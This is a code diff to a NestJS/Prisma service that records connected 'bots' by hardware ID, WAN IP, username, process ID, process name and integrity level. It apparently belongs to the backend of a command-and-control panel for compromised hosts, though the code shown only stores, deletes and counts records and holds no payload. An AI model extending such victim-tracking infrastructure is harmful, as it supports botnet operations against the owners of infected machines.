@@ -30,7 +30,10 @@ export class PattayaMessagesService {
                             socketId: bot.socketId,
                             username: bot.username,
                             wanIp: bot.wanIp,
-                            online: true
+                            architecture: bot.architecture,
+                            processId: bot.processId,
+                            integrity: bot.integrity,
+                            processName: bot.processName,
                         }
                     }
                 )
@@ -46,7 +49,10 @@ export class PattayaMessagesService {
                         socketId: bot.socketId,
                         username: bot.username,
                         wanIp: bot.wanIp,
-                        online: true
+                        architecture: bot.architecture,
+                        processId: bot.processId,
+                        integrity: bot.integrity,
+                        processName: bot.processName,
                     }
                 })
             }
@@ -62,16 +68,11 @@ export class PattayaMessagesService {
             const found = await this.prisma.bot.findFirst({where: {socketId}})
             if(found == null) return
             if(found){
-                await this.prisma.bot.update(
-                    {
-                        where: {
-                            hwid: found.hwid
-                        },
-                        data: {
-                            online: false
-                        }
+                await this.prisma.bot.deleteMany({
+                    where: {
+                        socketId: socketId
                     }
-                )
+                })
             }
             this.logger.log(`set bot hwid: ${found.hwid}, OFFLINE`)
         } catch (error) {
@@ -90,11 +91,7 @@ export class PattayaMessagesService {
 
       async getOnlineBot(){
         try {
-            const bots = await this.prisma.bot.findMany({
-                where: {
-                    online: true
-                }
-            })
+            const bots = await this.prisma.bot.findMany({})
             return bots.length
         } catch (error) {
             this.logger.error(`Something wrong`, error)
